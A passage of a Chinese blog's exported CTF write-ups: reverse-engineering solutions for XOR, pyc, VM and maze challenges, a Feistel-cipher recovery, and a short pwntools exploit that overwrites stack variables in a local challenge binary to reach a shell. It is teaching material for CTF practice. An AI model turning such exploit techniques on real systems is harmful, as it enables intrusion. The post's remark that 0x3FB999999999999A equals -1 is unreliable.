参考网站https://www.cnblogs.com/hongyuyingxiao/p/9630173.htmlhttps://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/","categories":[],"tags":[{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"南邮-逆向-writeup","slug":"南邮-逆向-writeup","date":"2018-11-22T08:12:02.000Z","updated":"2019-03-26T06:14:30.230Z","comments":true,"path":"2018/11/22/南邮-逆向-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/11/22/南邮-逆向-writeup/","excerpt":"做了一下南邮的逆向题。","text":"做了一下南邮的逆向题。 Hello,RE!12$ file 1.exe 1.exe: PE32 executable (console) Intel 80386, for MS Windows 32位PE文件，拖进ida在main函数中就有flag： 1234567891011121314151617181920212223242526272829303132int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+11h] [ebp-7Fh] int v5; // [esp+75h] [ebp-1Bh] int v6; // [esp+79h] [ebp-17h] int v7; // [esp+7Dh] [ebp-13h] int v8; // [esp+81h] [ebp-Fh] int v9; // [esp+85h] [ebp-Bh] int v10; // [esp+89h] [ebp-7h] __int16 v11; // [esp+8Dh] [ebp-3h] char v12; // [esp+8Fh] [ebp-1h] __main(); printf(fmt); v5 = 'galf'; v6 = 'leW&#123;'; v7 = 'emoc'; v8 = '_oT_'; v9 = 'W_ER'; v10 = 'dlro'; v11 = '&#125;!'; v12 = 0; while ( scanf(\"%s\", &amp;v4) != -1 &amp;&amp; strcmp(&amp;v4, (const char *)&amp;v5) ) printf(aFlag); printf(aFlagoye); printf(aEc); printf(aEooaouctfNupts); printf(aOuU); getchar(); getchar(); return 0;&#125; 脚本： 12345678910#!/usr/bin/env pythonv5 = 'galf'v6 = 'leW&#123;'v7 = 'emoc'v8 = '_oT_'v9 = 'W_ER'v10 = 'dlro'v11 ='&#125;!'flag = v5[::-1] + v6[::-1] + v7[::-1] + v8[::-1] + v9[::-1] + v10[::-1] + v11[::-1]print flag ReadAsm2题目给了一个main函数： 123456789int main(int argc, char const *argv[])&#123; char input[] = &#123;0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c&#125;; func(input, 28); printf(\"%s\\n\",input+1); return 0;&#125; 以及一个汇编的func函数： 123456789101112131415161718192021222324252600000000004004e6 &lt;func&gt;: 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi ; first arg =&gt; input 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi ; second arg =&gt; length 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 ; i = 1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] ; &lt;func+0x14&gt; 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] ; rdi 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] ; input[rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] ; 1 40051a: 31 ca xor edx,ecx ; xor(input[i] ^ i) 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 ; i += 1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] ; &lt;func+0x3c&gt; 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] ; length 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret 分析func可以看到大概是对每个byte和递增的i异或，然后得到flag。脚本： 123456#!/usr/bin/env pythonenc = [0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c]flag = ''for i in range(len(enc)): flag += chr(enc[i] ^ i)print flag Py交易给了一个pyc文件，在线反编译一下或者用工具python-uncompile6反编译得到源代码。 12345678910111213141516171819202122232425262728$ uncompyle6 Py.pyc # uncompyle6 version 3.2.4# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Mar 4 2019, 09:02:22) # [GCC 4.2.1 Compatible Apple LLVM 10.0.0 (clang-1000.11.45.5)]# Embedded file name: 1.py# Compiled at: 2017-06-03 10:20:43import base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong'# okay decompiling Py.pyc 照着写个脚本： 12345678#!/usr/bin/env pythonimport base64enc = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''tmp = base64.b64decode(enc)for c in tmp: flag += chr((ord(c) - 16) ^ 32)print flag WxyVM1拿到文件先file一下： 12AssassinQ@MacBook-Air  ~/Downloads  file WxyVM1WxyVM1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0391bf87f6f7a11b4d23e29eb39330a762aff5b4, stripped 然后拿到虚拟机下运行一下看看什么样： 12345[Desktop] ./WxyVM1 3:25:21 [WxyVM 0.0.1]input your flag:nctf&#123;123456&#125;wrong 没看出啥东西，基本判断就是程序应该是一个对flag的加密。然后拖进ida里分析： 1234567891011121314151617181920212223__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+Bh] [rbp-5h] signed int i; // [rsp+Ch] [rbp-4h] puts(\"[WxyVM 0.0.1]\"); puts(\"input your flag:\"); scanf(\"%s\", &amp;input); v4 = 1; vm_start(); if ( strlen(&amp;input) != 24 ) v4 = 0; for ( i = 0; i &lt;= 23; ++i ) &#123; if ( *(&amp;input + i) != enc[i] ) v4 = 0; &#125; if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL;&#125; main函数中输入一个flag，然后一个vm加密函数，再将加密过后的flag与存放在data段中的enc比较，如果相等那么输出correct。所以基本思路应该是通过enc逆出flag。然后进到vm_start函数中看看： 12345678910111213141516171819202122232425262728293031323334353637383940__int64 vm_start()&#123; unsigned int v0; // ST04_4 __int64 result; // rax signed int i; // [rsp+0h] [rbp-10h] char v3; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 14999; i += 3 ) &#123; v0 = byte_6010C0[i]; v3 = byte_6010C0[i + 2]; result = v0; switch ( v0 ) &#123; case 1u: result = byte_6010C0[i + 1]; *(&amp;input + result) += v3; break; case 2u: result = byte_6010C0[i + 1]; *(&amp;input + result) -= v3; break; case 3u: result = byte_6010C0[i + 1]; *(&amp;input + result) ^= v3; break; case 4u: result = byte_6010C0[i + 1]; *(&amp;input + result) *= v3; break; case 5u: result = byte_6010C0[i + 1]; *(&amp;input + result) ^= *(&amp;input + byte_6010C0[i + 2]); break; default: continue; &#125; &#125; return result;&#125; 这里发现在data段中还有一个byte数组。总共有15000个数，每三个数一组。第一个数作为需要执行的指令，第二个数为输入flag的下标，第三个数为与其进行操作的数据。到这里基本已经清楚了，把数据都dump下来，写个脚本逆一下就ok了。然后还需要注意的是，这里的运算是以byte为单位，可能会产生溢出，所以应该每次操作之后模一下256。 看到网上大多数wp都是用idc脚本patch，因为数据确实太多了，连lazyida都dump不出来。我是选择手动复制出来所有的数据，然后再用python正则匹配一下，提取出来。 最后的脚本： 1234567891011121314151617181920212223242526272829303132333435363738import ref = open('WxyVM1.txt', 'r')enc = [0xFFFFFFC4, 0x00000034, 0x00000022, 0xFFFFFFB1, 0xFFFFFFD3, 0x00000011, 0xFFFFFF97, 0x00000007, 0xFFFFFFDB, 0x00000037, 0xFFFFFFC4, 0x00000006, 0x0000001D, 0xFFFFFFFC, 0x0000005B, 0xFFFFFFED, 0xFFFFFF98, 0xFFFFFFDF, 0xFFFFFF94, 0xFFFFFFD8, 0xFFFFFFB3, 0xFFFFFF84, 0xFFFFFFCC, 0x00000008]text = f.read()f.close()pat = re.compile(r'db.&#123;5&#125;')find_pat = pat.findall(text)nums = []for n in find_pat: n = n[2:].strip() if n.endswith('h'): n = int(n[:-1], 16) else: n = int(n) nums.append(n)def cal(v0, v3, index): if v0 == 1: enc[index] = (enc[index] - v3) % 256 elif v0 == 2: enc[index] = (enc[index] + v3) % 256 elif v0 == 3: enc[index] = (enc[index] ^ v3) % 256 elif v0 == 4: enc[index] = (enc[index] / v3) % 256 elif v0 == 5: enc[index] = (enc[index] ^ enc[v3]) % 256for i in range(5000): t = 5000 - i v0 = nums[3 * t - 3] v3 = nums[3 * t - 1] res = nums[3 * t - 2] cal(v0, v3, res)flag = ''for i in range(len(enc)): flag += chr(enc[i])print flag maze12$ file maze maze: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=eda1df76eec45447cd0e1ad208a7eff914e86758, stripped 64位ELF文件，拖进ida： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 i; // rbx signed int choice; // eax bool v5; // bp bool v6; // al const char *v7; // rdi __int64 pos; // [rsp+0h] [rbp-28h] pos = 0LL; puts(\"Input flag:\"); scanf(\"%s\", &amp;flag, 0LL); if ( strlen(&amp;flag) != 24 || strncmp(&amp;flag, \"nctf&#123;\", 5uLL) || *(&amp;byte_6010BF + 24) != '&#125;' ) &#123;LABEL_22: puts(\"Wrong flag!\"); exit(-1); &#125; i = 5LL; if ( strlen(&amp;flag) - 1 &gt; 5 ) &#123; while ( 1 ) &#123; choice = *(&amp;flag + i); v5 = 0; if ( choice &gt; 78 ) &#123; choice = (unsigned __int8)choice; if ( (unsigned __int8)choice == 'O' ) &#123; v6 = left((_DWORD *)&amp;pos + 1); goto LABEL_14; &#125; if ( choice == 'o' ) &#123; v6 = down((int *)&amp;pos + 1); goto LABEL_14; &#125; &#125; else &#123; choice = (unsigned __int8)choice; if ( (unsigned __int8)choice == '.' ) &#123; v6 = up(&amp;pos); goto LABEL_14; &#125; if ( choice == '0' ) &#123; v6 = right((int *)&amp;pos);LABEL_14: v5 = v6; goto LABEL_15; &#125; &#125;LABEL_15: if ( !(unsigned __int8)check((__int64)maze, SHIDWORD(pos), pos) ) goto LABEL_22; if ( ++i &gt;= strlen(&amp;flag) - 1 ) &#123; if ( v5 ) break;LABEL_20: v7 = \"Wrong flag!\"; goto LABEL_21; &#125; &#125; &#125; if ( maze[8 * (signed int)pos + SHIDWORD(pos)] != '#' ) goto LABEL_20; v7 = \"Congratulations!\";LABEL_21: puts(v7); return 0LL;&#125; 迷宫题，一波分析之后大概就能得到上下左右移动对应的字符，以及对应的一些check，在内存中可以找到8x8的迷宫。脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344''' ******* * **** * **** * *** *# *** *** *** *********left - Odown - 0right - oup - .'''flag = 'nctf&#123;o0oo00O000oooo..OO&#125;'assert len(flag) == 24maze = [ [' ', ' ', '*', '*', '*', '*', '*', '*'], ['*', ' ', ' ', ' ', '*', ' ', ' ', '*'], ['*', '*', '*', ' ', '*', ' ', '*', '*'], ['*', '*', ' ', ' ', '*', ' ', '*', '*'], ['*', ' ', ' ', '*', '#', ' ', ' ', '*'], ['*', '*', ' ', '*', '*', '*', ' ', '*'], ['*', '*', ' ', ' ', ' ', ' ', ' ', '*'], ['*', '*', '*', '*', '*', '*', '*', '*']]directions = flag[5:-1]i, j = 0, 0for d in directions: if d == 'O': j -= 1 elif d == '0': i += 1 elif d == 'o': j += 1 elif d == '.': i -= 1 if maze[i][j] == '#' and d == len(directions) - 1: print 'success' break if maze[i][j] == '*': print 'failed' assert Falseprint flag WxyVM2file一下： 12AssassinQ@MacBook-Air  ~/Downloads  file WxyVM2WxyVM2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e57d1a1b70ac3d843afa30523dbbbc53c4ff341f, stripped 运行一下，发现和上一题VM应该基本是同一个类型： 12345[Desktop] ./WxyVM2 3:25:36 [WxyVM 0.0.2]input your flag:nctf&#123;123456&#125;wrong 然后拖进ida里，只有一个main函数。f5反编译发现提示说函数太大，无法反编译。这个时候需要先修改一下ida的配置文件hexrays.cfg，具体操作。修改完后看一下main函数的情况： 1234567891011121314151617181920212223__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+Bh] [rbp-5h] signed int i; // [rsp+Ch] [rbp-4h] puts(\"[WxyVM 0.0.2]\"); puts(\"input your flag:\"); scanf(\"%s\", &amp;input); v4 = 1; if ( strlen(&amp;input) != 25 ) v4 = 0; [......] for ( i = 0; i &lt;= 24; ++i ) &#123; if ( *(&amp;input + i) != enc[i] ) v4 = 0; &#125; if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL;&#125; 头和尾是基本一样的，主要是中间的部分，是一段又臭又长的对数据的加密： 我们输入的input应该都是byte，而这么多dword的操作其实都是对加密部分的混淆。然后这里的话我是把main函数提出来，然后筛选出byte开头的语句，并且通过一系列切片简化语句。然后把数据段里被加密的flag即enc数组dump出来，将提取出来的语句进行逆向的实现，就能输出flag。 其他的一些注意实现和前一题一样。最后的实现脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253f = open('WxyVM2.txt', 'r')text = f.read()f.close()enc = [0xFFFFFFC0, 0xFFFFFF85, 0xFFFFFFF9, 0x0000006C, 0xFFFFFFE2, 0x00000014, 0xFFFFFFBB, 0xFFFFFFE4, 0x0000000D, 0x00000059, 0x0000001C, 0x00000023, 0xFFFFFF88, 0x0000006E, 0xFFFFFF9B, 0xFFFFFFCA, 0xFFFFFFBA, 0x0000005C, 0x00000037, 0xFFFFFFFF, 0x00000048, 0xFFFFFFD8, 0x0000001F, 0xFFFFFFAB, 0xFFFFFFA5]ori = text.split(';\\n')ops = []for s in ori: if s.startswith('d'): continue elif s.startswith('b'): t = s[:1] + s[9:11] + s[12:14] + s[15:] ops.append(t) elif s.startswith('--'): t = s[2:3] + s[-2:] + '-=1' ops.append(t) elif s.startswith('++'): t = s[2:3] + s[-2:] + '+=1' ops.append(t) else: continueops = ops[::-1]def getPart(op): index = int(op[1:3], 16) symbol = op[3:4] num = op[5:] if num.endswith('u'): num = num[:-1] if num.startswith('0x'): num = int(num, 16) else: num = int(num) return index, symbol, numdef cal(index, symbol, num): if symbol == '+': enc[index] = (enc[index] - num) % 256 elif symbol == '-': enc[index] = (enc[index] + num) % 256 elif symbol == '^': enc[index] = (enc[index] ^ num) % 256 else: print 'error'for op in ops: index, symbol, num = getPart(op) # print 'enc[', index, ']', symbol, num cal(index, symbol, num)flag = ''for i in range(len(enc)): flag += chr(enc[i])print flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"2018-护网杯-review","slug":"2018-护网杯-review","date":"2018-10-16T10:18:29.000Z","updated":"2019-01-26T13:24:28.190Z","comments":true,"path":"2018/10/16/2018-护网杯-review/","link":"","permalink":"https://qianfei11.github.io/2018/10/16/2018-护网杯-review/","excerpt":"看着大佬们的wp复现一波。","text":"看着大佬们的wp复现一波。 迟到的签到题充分证明了自己是个签到题选手。 12345678910import base64enc = ''enc = base64.b64decode(enc)# test = 'flag&#123;'# for i in range(len(test)):# print chr(ord(test) ^ ord(enc)),flag = ''for i in range(len(enc)): flag += chr(ord(enc[i]) ^ ord('f'))print flag FEZ给出了一个py实现的加密算法，和一个被加密后输出的log。了解一下之后，大概是菲斯特尔(Feistel)密码，也就是DES。 分析一下，可以发现比较难的点是中间的多次繁琐的异或，逆向实现较难。通过正向分析加密的过程来观察。 12345678910111213// l即左半部分，r即右半部分 l + r1. r + r^l^k12. r^l^k1 + r^l^k1^r^k2 =&gt; r^l^k1 + l^k1^k23. l^k1^k2 + l^k1^k2^r^l^k1^k3 =&gt; l^k1^k2 + r^k2^k34. r^k2^k3 + r^k2^k3^l^k1^k2^k4 =&gt; r^k2^k3 + r^l^k1^k3^k45. r^l^k1^k3^k4 + r^l^k1^k3^k4^r^k2^k3^k5 =&gt; r^l^k1^k3^k4 + l^k1^k2^k4^k56. l^k1^k2^k4^k5 + l^k1^k2^k4^k5^r^l^k1^k3^k4^k6 =&gt; l^k1^k2^k4^k5 + r^k2^k3^k5^k67. r^k2^k3^k5^k6 + r^k2^k3^k5^k6^l^k1^k2^k4^k5^k7 =&gt; r^k2^k3^k5^k6 + r^l^k1^k3^k4^k6^k7// 对于m和test来说是一样的enc1 = xor(test, k) = t_r^k2^k3^k5^k6 + t_r^t_l^k1^k3^k4^k6^k7enc2 = xor(m, k) = m_r^k2^k3^k5^k6 + m_r^m_l^k1^k3^k4^k6^k7 由于test的值是已知的，可以先利用test的左右两部分求出k2356和k13467。然后再利用这两个数求出m的左右两部分，m中就含有flag。脚本如下： 12345678910111213141516171819202122def xor(a,b): assert len(a)==len(b) c=\"\" for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return ctest = '8664f7f564f097907c082328ebcdc95e8dc37eec3827fd9c93cc84ebb517c5e396c19d12e730ee3f3fb9e84110f9c92b29ddeab60797'enc1 = '4b4ce14cdb9ace2c678b9a64892cc9d5f2a61e7e2dc256877f2fb454c4d37760278640ab1737c62ba4a403acb14a893facfc1819b259'enc2 = 'd4c898ee5f6b68d6120bd7fb11f5cf4d0431324c40e0b3a6ae9fbd1f17295be643c45ec7f306063dd1009ae5d62b0803c7909629aba7't_l = test.decode('hex')[:27]t_r = test.decode('hex')[27:]k2356 = xor(enc1.decode('hex')[:27], t_r)k13467 = xor(xor(enc1.decode('hex')[27:], t_r), t_l)m_r = xor(enc2.decode('hex')[:27], k2356)m_l = xor(xor(enc2.decode('hex')[27:], m_r), k13467)flag = m_l + m_rprint flag GETTINGSTART拿到题目跑了一下，然后checksec看看开了什么保护： 1234567qianfei@qianfeideMacBook-Air ~/ti/2018 huwangbei/GETTINGSTART checksec task_gettingStart_ktQeERc[*] &apos;/Users/qianfei/ti/2018 huwangbei/GETTINGSTART/task_gettingStart_ktQeERc&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖进ida里看一看，就是很明显的栈溢出： 12345678910111213141516171819202122232425262728293031__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 buf; // [rsp+10h] [rbp-30h] __int64 v5; // [rsp+18h] [rbp-28h] __int64 v6; // [rsp+20h] [rbp-20h] __int64 v7; // [rsp+28h] [rbp-18h] double v8; // [rsp+30h] [rbp-10h] unsigned __int64 v9; // [rsp+38h] [rbp-8h] v9 = __readfsqword(0x28u); buf = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0x7FFFFFFFFFFFFFFFLL; v8 = 1.797693134862316e308; setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(\"HuWangBei CTF 2018 will be getting start after %lu seconds...\\n\", 0LL, 1.797693134862316e308); puts(\"But Whether it starts depends on you.\"); read(0, &amp;buf, 0x28uLL); if ( v7 != 0x7FFFFFFFFFFFFFFFLL || v8 != 0.1 ) &#123; puts(\"Try again!\"); &#125; else &#123; printf(\"HuWangBei CTF 2018 will be getting start after %g seconds...\\n\", &amp;buf, v8); system(\"/bin/sh\"); &#125; return 0LL;&#125; buf和v7还有v8之间的相对位置也比较清楚，主要就是解决double的0.1在内存中存储是什么样子的。通过写一个小的c程序得到结果： 12345678#include &lt;stdio.h&gt;int main() &#123; double x = 0.1; long long n = *(long long*)&amp;x; printf(\"%llX\", n); return 0;&#125; 输出结果为0x3FB999999999999A，也就是-1的值。exp如下： 12345678from pwn import *p = process('./task1')v7 = 0x7FFFFFFFFFFFFFFFv8 = 0x3FB999999999999Aoffset = 0x28payload = (p64(v7) + p64(v8)).rjust(offset, '\\0')p.sendline(payload)p.interactive() RERERE此处记录lilac的writeup 通过搜索字符串找到程序校验位置，分析虚表中的函数，发现这又是一个虚拟机，因此只需要按照套路将每一个虚拟机的指令分析清楚，最终分析得到的虚表是这样的： 123456789101112131415161718192021222324252627282930.rdata:004031CC ; const RE::`vftable&apos;.rdata:004031CC ??_7RE@@6B@ dd offset assign_hi ; DATA XREF: sub_4016A0+46↑o.rdata:004031D0 dd offset get_par_hi.rdata:004031D4 dd offset inc_ip.rdata:004031D8 dd offset get_par_lo.rdata:004031DC dd offset dec_assign_hi.rdata:004031E0 dd offset add_to_hi.rdata:004031E4 dd offset subs_to_hi.rdata:004031E8 dd offset inc_assign_hi.rdata:004031EC dd offset xor_to_hi.rdata:004031F0 dd offset and_to_hi.rdata:004031F4 dd offset mul_to_hi.rdata:004031F8 dd offset mod_to_hi.rdata:004031FC dd offset push_hi.rdata:00403200 dd offset assign_lo_to_hi.rdata:00403204 dd offset load_to_hi.rdata:00403208 dd offset push.rdata:0040320C dd offset pop.rdata:00403210 dd offset store.rdata:00403214 dd offset j_flag_neg1.rdata:00403218 dd offset j_flag_1.rdata:0040321C dd offset j_not_flag.rdata:00403220 dd offset jmp_bck_cnt.rdata:00403224 dd offset cmp_hi_to_lo.rdata:00403228 dd offset inc_mem_ptr.rdata:0040322C dd offset dec_mem_ptr.rdata:00403230 dd offset xor_block.rdata:00403234 dd offset init_regs.rdata:00403238 dd offset get_res.rdata:0040323C dd offset execute_vm 其中名字中hi表示目标寄存器编号，lo表示源寄存器编号，execute_vm是执行虚拟机代码的函数，执行程序中硬编码的一段虚拟机指令。在ida中新建一个结构，将各个偏移的名字填上虚表函数名，就可以在execute_vm中看到opcode所对应的具体函数是什么了。通过分析这些函数的操作也很容易确定虚拟机的结构： 123456789101100000000 Vm 00000000 vtable dd ? 00000004 reg0 dd ?00000008 reg1 dd ?0000000C reg2 dd ?00000010 cnt dd ?00000014 flag dd ?00000018 maybe_mem dd ?0000001C field_1C dd ?00000020 stack dd ?00000024 ip_ptr dd ? 于是可以写python脚本将opcode还原成易读的伪汇编语言的形式： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253code = [79, 0, 0, 0, 47, 85, 5, 84, 48, 70, 0, 71, 34, 72, 2, 75, 51, 73, 79, 0, 0, 0, 70, 84, 16, 72, 1, 77, 39, 79, 0, 0, 0, 48, 84, 16, 72, 1, 68, 22, 79, 0, 0, 0, 57, 84, 16, 72, 1, 68, 11, 79, 0, 0, 0, 65, 84, 1, 72, 1, 68, 6, 71, 0, 72, 0, 75, 5, 71, 0, 80, 0, 67, 85, 64, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 51, 180, 136, 172, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 74, 11, 148, 63, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 124, 92, 220, 236, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 57, 41, 117, 27, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 30, 242, 107, 45, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 131, 141, 181, 46, 84, 32, 72, 18, 71, 0, 75, 2, 80, 0, 67]opcodes = &#123; 67: (\"return result\", 1), 68: (\"j_flag_neg1\", 2), 69: (\"mod_to_hi\", 2), 70: (\"load_to_hi\", 2), 71: (\"xor_to_hi\", 2), 72: (\"cmp_hi_to_lo\", 2), 73: (\"inc_mem_ptr\", 1), 74: (\"and_to_hi\", 2), 75: (\"j_not_flag\", 2), 76: (\"xor_block\", 16), 77: (\"j_flag_1\", 2), 78: (\"dec_assign_hi\", 2), 79: (\"push\", 5), 80: (\"inc_assign_hi\", 2), 81: (\"assign_lo_to_hi\", 2), 82: (\"push hi\", 2), 83: (\"add_to_hi\", 2), 84: (\"pop hi\", 2), 85: (\"jmp_bck_cnt\", 2), 86: (\"dec_mem_ptr\", 1), 87: (\"store hi\", 2), 88: (\"mul_to_hi\", 2), 89: (\"subs_to_hi\", 2)&#125;pc = 0while pc != len(code): opcode = code[pc] name = opcodes[opcode][0] length = opcodes[opcode][1] print \"%03x\\t\" % pc, print name, if length == 1: print pc += 1 elif length == 2: if 'hi' in name: print code[pc+1] &gt;&gt; 4, code[pc+1] &amp; 0xf else: print hex(code[pc+1]) pc += 2 elif length == 5: num = (code[pc+1] &lt;&lt; 24) | (code[pc+2] &lt;&lt; 16) | (code[pc+3] &lt;&lt; 8) | (code[pc+4] &lt;&lt; 0) print hex(num) pc += 5 elif length == 16: print for i in range(15): code[i + pc + 1] ^= 0x66 pc += 16 运行得到如下输出（输出中注释是分析过程）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200000 push 0x2f005 jmp_bck_cnt 0x5007 pop hi 3 0009 load_to_hi 0 000b xor_to_hi 2 200d cmp_hi_to_lo 0 200f j_not_flag 0x33 =&gt; 0x44011 inc_mem_ptr012 push 0x46017 pop hi 1 0019 cmp_hi_to_lo 0 101b j_flag_1 0x27 =&gt; 0x4401d push 0x30022 pop hi 1 0024 cmp_hi_to_lo 0 1026 j_flag_neg1 0x16 =&gt; 0x3e028 push 0x3902d pop hi 1 002f cmp_hi_to_lo 0 1031 j_flag_neg1 0xb =&gt; 0x3e033 push 0x41038 pop hi 0 103a cmp_hi_to_lo 0 103c j_flag_neg1 0x6 =&gt; 0x4403e xor_to_hi 0 0040 cmp_hi_to_lo 0 0042 j_not_flag 0x5 =&gt; 0x49fail:044 xor_to_hi 0 0046 inc_assign_hi 0 0048 return result049 jmp_bck_cnt 0x40(check hex digits)04b push 0x7 050 pop hi 3 0 // cnt = 0x7052 xor_to_hi 1 1 // reg[1] = 0back:054 dec_mem_ptr055 load_to_hi 0 0 // reg[0] = c057 push 0x3005c pop hi 2 0 // reg[2] = 0x3005e subs_to_hi 0 2 // c-=0x30060 push 0xa065 pop hi 2 0 // reg[2] = 10067 cmp_hi_to_lo 0 2069 j_flag_neg1 0x9 // c &lt; 10 =&gt; less_than_1006b push 0x7070 pop hi 2 0 // reg[2] = 7072 subs_to_hi 0 2 // c-=7less_than_10:074 push 0x10079 pop hi 2 007b mul_to_hi 1 2 i &lt;&lt; 407d add_to_hi 1 0 i += c07f jmp_bck_cnt 0x2b =&gt; back081 push 0x33b488ac086 pop hi 2 0088 cmp_hi_to_lo 1 208a xor_to_hi 0 008c j_not_flag 0x308e inc_assign_hi 0 0090 return result(后七个字符为 &quot;33b488ac&quot;[::-1])091 push 0x7096 pop hi 3 0098 xor_to_hi 1 109a dec_mem_ptr09b load_to_hi 0 